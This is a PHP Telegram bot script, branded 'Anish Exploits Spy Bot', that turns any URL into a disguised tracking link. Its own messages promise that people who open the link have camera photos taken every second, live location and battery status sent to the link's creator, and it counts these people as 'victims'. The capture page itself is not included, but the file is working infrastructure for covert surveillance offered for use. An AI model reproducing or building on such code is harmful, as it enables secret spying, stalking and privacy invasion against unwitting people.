<?php
// ===== AUTO-CREATE DIRS (Render restart pe kaam karega) =====
if (!is_dir('photos')) mkdir('photos', 0777, true);
if (!file_exists('visitors.json')) file_put_contents('visitors.json', '{}');
if (!file_exists('links.json')) file_put_contents('links.json', '{}');
if (!file_exists('debug.log')) file_put_contents('debug.log', date('Y-m-d H:i:s') . " - bot.php started\n");
// ============================================================

require_once 'config.php';

$botToken = $config['bot_token'];
$website = $config['website'];

$content = file_get_contents("php://input");
$update = json_decode($content, true);

$text = $update['message']['text'] ?? '';
$chatId = $update['message']['chat']['id'] ?? $update['callback_query']['message']['chat']['id'];
$callback = $update['callback_query'] ?? null;

// Handle /start
if ($text == "/start") {
    $keyboard = [
        'inline_keyboard' => [
            [["text" => "🔗 Generate Spy Link", "callback_data" => "generate"]],
            [["text" => "📊 My Victims", "callback_data" => "stats"]]
        ]
    ];
    sendMessage($chatId, "👾 *Anish Exploits Spy Bot*\n\nSend any URL, I'll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸", json_encode($keyboard));
}

// Generate button
if ($callback && $callback["data"] == "generate") {
    sendMessage($callback["from"]["id"], "📥 *Send target URL*\nExample: `https://youtube.com`");
    answerCallback($callback["id"]);
}

// Stats button
if ($callback && $callback["data"] == "stats") {
    $allVisitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    $myVisitors = [];
    
    foreach ($allVisitors as $id => $data) {
        if (isset($data['generated_by']) && $data['generated_by'] == $callback["from"]["id"]) {
            $myVisitors[] = $data;
        }
    }
    
    $total = count($myVisitors);
    sendMessage($callback["from"]["id"], "📊 *Your Victims:* $total\n\n🔗 Generate more links to track more people!");
    answerCallback($callback["id"]);
}

// User sends URL - Convert to spy link
if ($text && filter_var($text, FILTER_VALIDATE_URL)) {
    $parsed = parse_url($text);
    $domain = str_replace(['www.', '.'], ['', '_'], $parsed['host'] ?? 'link');
    $shortCode = $domain . '_' . substr(time(), -4);
    
    $db = json_decode(file_get_contents("links.json"), true) ?? [];
    $db[$shortCode] = [
        'url' => $text,
        'created_by' => $chatId,
        'created_at' => date('Y-m-d H:i:s')
    ];
    file_put_contents("links.json", json_encode($db));
    
    $spyLink = $website . $shortCode;
    
    sendMessage($chatId, "✅ *Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n*All photos will come to YOU!*");
}

function sendMessage($chatId, $text, $replyMarkup = null) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ["chat_id" => $chatId, "text" => $text, "parse_mode" => "Markdown"];
    if ($replyMarkup) $data['reply_markup'] = $replyMarkup;
    file_get_contents($url . "?" . http_build_query($data));
}

function answerCallback($id) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
    file_get_contents($url . "?callback_query_id=" . $id);
}
?>
